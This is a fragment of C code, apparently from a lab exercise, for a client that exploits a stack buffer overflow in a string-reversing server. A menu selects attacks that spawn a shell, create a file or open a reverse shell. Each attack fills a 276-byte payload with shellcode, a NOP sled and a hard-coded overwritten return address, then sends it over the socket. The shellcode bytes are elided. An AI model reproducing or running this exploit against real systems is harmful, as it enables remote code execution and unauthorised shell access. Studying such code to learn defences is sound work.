...
*/
	...
	for(int i=0; i<256; i++)
	{
    	...
    	printf("Please input a string to reverse('exit' to quit,'attack1' to get shell,'attack2' to create file,'attack3' to get severse_shell):");
		...
		else if(strcmp(sendbuf,"attack1\n")==0)	// shell
		{
	  		...
	  		payload[273]='\xee';
	  		payload[274]='\xff';
	  		payload[275]='\xbf'; // buf:0xbfffee5c  &ret=0xbfffef6c
	    		write(sock_cli, payload, 276);
	    		// 获取shell后结束通信
	    		printf("attack1 done.\n");
	    		break;
		}
		else if(strcmp(sendbuf,"attack2\n")==0) // create_file
		{
	  		for(i=0;i<strlen(shellcode2);i++)
	  		{
	    			payload[i]=shellcode2[i];
	  		}
	  		for(i=strlen(shellcode2);i<272;i++)
	  		{
	    			payload[i]='\x90';
	  		}
	  		payload[272]='\x5c';
		...
		else if(strcmp(sendbuf,"attack3\n")==0) // severse_shell
		{
	  		for(i=0;i<strlen(shellcode3);i++)
	  		{
	    			payload[i]=shellcode3[i];
	  		}
	  		for(i=strlen(shellcode3);i<272;i++)
	  		{
	    			payload[i]='\x90';
	  		}
	  		payload[272]='\x5c';
